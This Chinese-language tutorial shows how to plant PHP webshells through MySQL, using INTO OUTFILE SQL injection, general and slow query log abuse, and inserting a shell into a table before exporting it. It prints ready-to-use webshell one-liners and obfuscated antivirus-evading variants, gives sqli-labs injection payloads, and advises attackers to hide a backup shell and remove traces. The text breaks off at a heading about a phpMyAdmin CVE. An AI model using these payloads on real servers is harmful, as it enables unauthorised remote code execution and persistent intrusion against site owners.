## mysql如何向日志文件写webshell进行利用



> **Webshell** 是一种恶意代码，通常以脚本文件的形式存在，可以在受攻击的 Web 服务器上执行命令、操纵文件系统、窃取敏感信息等。攻击者可以通过各种方式将 Webshell 注入到目标服务器上，以获取非法访问权限。



MySQL 的日志文件是用于记录数据库服务器活动和事件的重要组成部分，这些日志文件对于故障排除、性能优化和安全审计非常有用。默认情况下，MySQL 的日志文件通常位于服务器的特定目录中。。在默认情况下，MySQL 会生成以下几种类型的日志文件：

1. 查询日志（Query Log）：记录所有发往 MySQL 服务器的查询语句。可以通过配置 MySQL 的选项来启用或禁用查询日志。攻击者可能会尝试通过注入恶意查询语句来在日志中插入 Webshell。
2. 错误日志（Error Log）：记录 MySQL 服务器遇到的错误和异常情况。错误日志对于故障排除和安全审计非常有用。攻击者可能会尝试通过利用服务器错误来触发异常行为，并在错误日志中留下 Webshell。
3. 慢查询日志（Slow Query Log）：记录执行时间超过预定义阈值的查询语句。慢查询日志用于性能优化和查询分析。攻击者可能会尝试通过构造复杂的查询语句来使其被记录在慢查询日志中，并在其中插入 Webshell。







### 使用outfile方法：

```
select '<?php @eval($_POST[1]);?>' into outfile 'D:/shell.php'
```

**成功向mysql写入webshell条件（至少）**

1. 数据库的当前用户为ROOT或拥有FILE权限；（FILE权限指的是对服务器主机上文件的访问） 
2. 知道网站目录的绝对路径； 
3. PHP的GPC参数为off状态； 
4. MySQL中的secure_file_priv参数不能为NULL状态。



**secure_file_priv**

secure-file-priv是一个系统变量，对于文件读/写功能进行限制。

secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。如下关于secure_file_priv的配置介绍

1. secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出，意味着通过outfile方法写入WebShell是无法成功的，但是通过导出日志的方法是可以的。
2. 当secure_file_priv的值为/tmp/（具体文件路径） ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
3. 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

注：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。

三种方法查看当前secure-file-priv的值：

select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like “secure_file_priv”;
修改：

通过修改my.ini文件，添加：secure-file-priv=
启动项添加参数：mysqld.exe --secure-file-priv=



Outfile方法其实是Mysql提供的一个用来写入文件的函数，当我们可以控制写入的文件内容以及文件的保存路径时，我们就可以达到传入WebShell的目的。当我们可以使用union查询时，我们构造一个如下语句，就可以达到效果：

```
Union select “这里是WebShell” into outfile “Web目录”；
```

当我们无法使用union时，还有一些其他方法也可以实现（利用分隔符写入）：

```
?id=1 INTO OUTFILE '物理路径' lines terminatedby （这里是WebShell）#
?id=1 INTO OUTFILE '物理路径' fields terminatedby （这里是WebShell）# 
?id=1 INTO OUTFILE'物理路径'columns terminatedby （这里是WebShell）# 
?id=1 INTO OUTFILE '物理路径' lines startingby （这里是WebShell）#
```







### 先看看sqli-labs第七关的笔记，也就是使用outfile方法：

```
?id=1'))UNION SELECT 1,2,3 into outfile "D:\\uuu.txt"--+
```

刚开始这儿一直不行，硬盘上出现不了uuu.txt，原因是自己的mysql设置问题。

在MySQL中，outfile可以用来输出一个文件。但是想要执行这样的操作，就必须要开启文件写入的权限。

我们可以执行：`show variables like '%secure%';`来查看：发现`secure_file_priv`的 value 值是 NULL，那么这代表此时文件写入的权限是关闭的，那我们需要写入输出文件的保存路径来开启它。

首先，我们来到MySQL的根目录下，会看到一个my.ini的文件。

打开my.ini文件，添加`secure_file_priv`以及他所对应的参数：（我写的是`secure_file_priv='D://'`）

```
在linux下可在/etc/my.cnf的[mysqld]里面，添加secure_file_priv=
```

注意：*路径的斜杠需要采用//需要多加一个斜杠来转义字符，其次，因为C盘的权限问题，请不要把路径写到C盘上。*【开始我没有注意这一点导致sql语句一直报错，很头疼】

之后我们重启 MySQL服务：

最后重复刚才的 sql 语句`show variables like '%secure%';` 来查看是否修改成功：发现已经出现路径了。

那这个时候，我们就可以执行`outfile`来输出文件到 D盘的任意位置了。

```
my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可以用于设置MySQL的基本运行参数、安全性、缓存、日志记录等方面的参数。
```

> 在sql漏洞中可以使用file系列函数
>
> load_file()  ：读取指定文件
> into outfile ：将查询的数据写入文件中
> into dumpfile：将查询的数据写入文件中(只能写入一行数据)
>
> ```
> secure_file_prive=null //限制mysqld 不允许导入导出
> secure_file_priv=/path/  //限制mysqld的导入导出只能发生在默认的/path/目录下
> secure_file_priv=’’  //不对mysqld 的导入 导出做限制
> ```
>
> outfile函数可以导出多行，而dumpfile只能导出一行数据
> outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式

这时候我们可以通过``

```
联合：
?id=-1')) union select version(),database(),user() into outfile "D:\\uuu.txt" --+

非联合：
?id=1')) into outfile "D:\\uuu.txt" fields terminated by '' --+
```

来使得所需信息输出到 uuu.txt

**注意：储存的文件路径uuu.txt也要本身没有这个文件才可以。**

**注意：闭合条件是'))，不然也不行**







### 基于log日志写入法(全局日志)

所以`mysql`在 my.ini 中设置了导出文件的路径，无法再使用`select …… into outfile`来写入一句话

此时在 mysql 文件夹下的 my.ini 中可以设置到处路径，但是在拿 shell 时，不可能去修改配置文件。

但是可以通过修改 mysql 的 log 文件来获取 webshell

1. 我们首先进入SQL环境，执行以下SQL语句：

```sql
show variables like "%general%";
```

2. 如果 `general_log`是OFF，则需要执行`set GLOBAL general_log='ON';`（开启日志功能）

3. 接下来设置日志存储路径`SET GLOBAL general_log_file='C:/phpStudy/www/xxx.php'`

4. 最后执行sql语句,写入日志文件`select "<?php system($_GET[a]);?>"`

```
免杀shell,eval方式
mysql> select "<?php $sl = create_function('', @$_REQUEST['klion']);$sl();?>";

别人的免杀shell,assert&base64encode方式    
mysql> SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['klion']));?>";     
```

5. 处理后事：

   干完活儿以后务必记得把配置恢复原状（不然,目标站如果访问量比较大,日志文件可能会瞬间暴增连shell时会巨卡），拿到shell记得马上再传一个shell（[放的隐蔽点），然后再通过新的shell把最开始这个shell删掉，谨慎一点，起码不会让你的shell掉的那么快。

   `set global general_log = off;`







### 基于log日志写入法(慢查询日志)

1. 查看慢查询日志开启情况`show variables like '%slow_query_log%';`
2. 开启慢查询日志`set global slow_query_log=1;`
3. 修改日志文件存储的绝对路径`set global slow_query_log_file='D:/shell.php';`
4. 向日志文件中写入shell`select '<?php @eval($_POST[1]);?>' or sleep(11);`







### 将shell写入表中+outfile

**利用条件：**

1. root权限

2. 网站的绝对路径且具有写入权限

执行如下语句写入shell：

1. 将shell插入一个表中`insert into sxss(comment) values ('<?php @eval($_POST[1]);?>');`

2. 查询该数据表，将结果导出文件`select comment from sxss into outfile 'D:/shell.php';`







###  CVE-2018-19968文件包含

**受影响的phpMyAdmin版本：4.8.0 ~ 4.8.3**

